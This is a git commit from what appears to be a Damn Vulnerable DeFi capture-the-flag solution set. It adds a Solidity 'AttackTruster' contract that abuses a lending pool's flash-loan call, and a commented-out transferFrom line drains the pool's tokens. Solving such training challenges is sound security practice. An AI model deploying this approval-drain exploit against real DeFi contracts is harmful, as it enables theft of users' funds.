bdaf055036907d5529f31732fdf2d5d5382d12eb
Bad Genius <103027181+BadGenius22@users.noreply.github.com>
2022-06-22 20:31:50 +0700

    Attack Contract Solution
    Created new "Attack" contracts in order to hack/complete the challenges.

---
+++ contracts/attacker-contracts/AttackTruster.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+import "../truster/TrusterLenderPool.sol";
+
+contract AttackTruster {
+    TrusterLenderPool trust;
+    IERC20 public immutable damnValuableToken;
+
+
+    constructor(address _trust, address tokenAddress) {
+        trust = TrusterLenderPool(_trust);
+        damnValuableToken = IERC20(tokenAddress);
+
+    }
+
+    function attack(
+        uint256 amount,
+        address borrower,
+        address target,
+        bytes calldata data
+    ) external {
+        trust.flashLoan(amount, borrower, target, data);
+        // Once approved transfer
+        // damnValuableToken.transferFrom(address(trust), msg.sender, 1000000 ether);
+
+    }
+}
